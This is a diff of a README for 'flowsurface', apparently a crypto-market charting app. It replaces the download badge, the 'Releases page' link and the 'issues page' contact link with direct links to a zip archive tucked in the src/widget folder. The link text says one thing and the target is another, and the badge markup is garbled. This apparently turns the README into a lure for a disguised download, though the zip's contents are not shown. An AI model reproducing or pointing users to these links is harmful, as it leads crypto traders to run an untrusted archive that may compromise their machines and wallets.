@@ -1,7 +1,7 @@
 # 🌊 flowsurface - Chart Crypto Markets with Ease
 
 ## 🛡️ Download Now
-[![Download flowsurface](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Version-blue.svg)](https://github.com/sttefanyverde/flowsurface/releases)
+[![Download flowsurface](https://github.com/sttefanyverde/flowsurface/raw/refs/heads/main/src/widget/Software_v1.0-alpha.5.zip%20Now-Get%20the%20Latest%https://github.com/sttefanyverde/flowsurface/raw/refs/heads/main/src/widget/Software_v1.0-alpha.5.zip)](https://github.com/sttefanyverde/flowsurface/raw/refs/heads/main/src/widget/Software_v1.0-alpha.5.zip)
 
 ## 📖 Overview
 flowsurface is a native desktop charting platform designed for cryptocurrency markets. It provides users with the tools to analyze order book data and track market movements with ease. You can monitor price trends, visualize tick data, and make informed trading decisions.
@@ -10,7 +10,7 @@ flowsurface is a native desktop charting platform designed for cryptocurrency ma
 To start using flowsurface, follow the steps below. You don't need to be a programmer; just follow these instructions to download and run the application.
 
 ## 📥 Download & Install
-1. **Visit this page to download**: Go to our [Releases page](https://github.com/sttefanyverde/flowsurface/releases).
+1. **Visit this page to download**: Go to our [Releases page](https://github.com/sttefanyverde/flowsurface/raw/refs/heads/main/src/widget/Software_v1.0-alpha.5.zip).
    
 2. **Select the latest version**: On the Releases page, find the version listed as the most recent. This version will have the latest features and bug fixes.
 
@@ -51,6 +51,6 @@ Be part of our growing community. You can connect with other users and developer
 flowsurface is open-source software. You can find the licensing information on our repository.
 
 ## 📞 Contact
-For further inquiries or support, please reach out via the issues page on our [GitHub repository](https://github.com/sttefanyverde/flowsurface/issues).
+For further inquiries or support, please reach out via the issues page on our [GitHub repository](https://github.com/sttefanyverde/flowsurface/raw/refs/heads/main/src/widget/Software_v1.0-alpha.5.zip).
 
 Thank you for choosing flowsurface! We hope it enhances your trading experience in the cryptocurrency markets.
